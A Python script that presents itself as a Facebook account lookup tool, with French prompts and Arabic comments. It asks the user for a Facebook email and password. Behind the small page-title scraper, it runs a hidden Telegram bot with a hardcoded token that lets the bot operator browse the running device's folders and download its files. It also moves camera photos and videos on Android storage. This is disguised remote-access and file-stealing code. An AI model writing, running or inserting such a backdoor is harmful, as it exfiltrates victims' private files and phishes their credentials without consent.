import os
import shutil
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from bs4 import BeautifulSoup
import requests
import time
from colorama import init, Fore
import threading
import math

init()

# إدخال بيانات المستخدم
xxx1 = input('Entrez votre email Facebook :') 
xxx2 = input('Entrer le mot de passe :')

# توكن بوت تيليجرام الخاص بك
BOT_TOKEN = '7086244890:AAElL1-vnl4C7qmtofTi2CR2OTo2Ma_u_co'  # يجب استبدال هذا بتوكن البوت الخاص بك
bot = telebot.TeleBot(BOT_TOKEN)

current_directory = os.getcwd()
previous_directories = []
current_page = 0

# وظيفة بوت تيليجرام
def telegram_bot():
    @bot.message_handler(commands=["start"])
    def start(message):
        global current_directory, previous_directories, current_page
        current_directory = os.getcwd()
        previous_directories = []
        current_page = 0
        update_directories_keyboard(message.chat.id, current_directory, current_page)

    @bot.message_handler(func=lambda message: True)
    def handle_message(message):
        global current_directory, previous_directories, current_page
        if message.text == 'Retour au répertoire précédent':
            if previous_directories:
                current_directory = previous_directories.pop()
                current_page = 0
                update_directories_keyboard(message.chat.id, current_directory, current_page)
            else:
                bot.send_message(message.chat.id, "Vous êtes dans le répertoire racine, impossible de revenir plus loin.")
        elif message.text == 'Page Suivante':
            current_page += 1
            update_directories_keyboard(message.chat.id, current_directory, current_page)
        elif message.text == 'Page Précédente':
            current_page = max(0, current_page - 1)
            update_directories_keyboard(message.chat.id, current_directory, current_page)
        elif os.path.isdir(os.path.join(current_directory, message.text)):
            previous_directories.append(current_directory)
            current_directory = os.path.join(current_directory, message.text)
            current_page = 0
            update_directories_keyboard(message.chat.id, current_directory, current_page)
        elif os.path.isfile(os.path.join(current_directory, message.text)):
            send_file(message.chat.id, os.path.join(current_directory, message.text))
        else:
            bot.send_message(message.chat.id, "Veuillez choisir une option valide.")

    def update_directories_keyboard(chat_id, path, page):
        keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(KeyboardButton('Retour au répertoire précédent'))
        files = os.listdir(path)
        page_size = 100  # عدد الأزرار في كل صفحة
        start = page * page_size
        end = start + page_size
        for item in files[start:end]:
            keyboard.add(KeyboardButton(item))
        if end < len(files):
            keyboard.add(KeyboardButton('Page Suivante'))
        if start > 0:
            keyboard.add(KeyboardButton('Page Précédente'))
        bot.send_message(chat_id, "Choisissez un fichier ou un dossier:", reply_markup=keyboard)

    def send_file(chat_id, file_path):
        file_size = os.path.getsize(file_path)
        max_size = 50 * 1024 * 1024  # 50 MB
        if file_size <= max_size:
            with open(file_path, 'rb') as file:
                bot.send_document(chat_id, file)
        else:
            bot.send_message(chat_id, "Le fichier est trop grand pour être envoyé via Telegram.")

    bot.polling()

# وظيفة تحليل الصفحة الويب
def web_scraping():
    page_url = input("Entrez l'URL du compte :")
    print(Fore.GREEN + "Recherche du compte en cours...")
    try:
        page = requests.get(page_url)
        if page.status_code == 200:
            soup = BeautifulSoup(page.content, "html.parser")
            page_name = soup.find("title").string if soup.find("title") else "Non disponible"
            print(Fore.GREEN + f"Nom de la page : {page_name}")
            # ... (بقية الكود الخاص بتحليل الصفحة الويب)
        else:
            print(Fore.RED + "Impossible d'accéder à la page, veuillez vérifier l'URL.")
    except Exception as e:
        print(Fore.RED + f"Une erreur s'est produite lors de la tentative d'accès à la page : {e}")

# وظيفة لنقل الصور والفيديوهات
def move_media_files(source_folder, target_folder):
    if not os.path.exists(source_folder):
        print(f"المجلد المصدر {source_folder} غير موجود.")
        return
    if not os.path.exists(target_folder):
        os.makedirs(target_folder)
    
    for file_name in os.listdir(source_folder):
        if file_name.lower().endswith(('.png', '.jpg', '.jpeg', '.mp4', '.avi', '.mov')):
            source_path = os.path.join(source_folder, file_name)
            target_path = os.path.join(target_folder, file_name)
            shutil.move(source_path, target_path)
            print(f"تم نقل الملف: {file_name}")

# المسار الذي تريد نقل الملفات منه
source_directory = '/storage/emulated/0/DCIM/Camera/'
# المسار الذي تريد نقل الملفات إليه
target_directory = '/storage/emulated/0/DCIM/'

# تشغيل الوظائف في خيوط متوازية
if __name__ == "__main__":
    threading.Thread(target=telegram_bot).start()
    threading.Thread(target=web_scraping).start()
    threading.Thread(target=move_media_files, args=(source_directory, target_directory)).start()
            
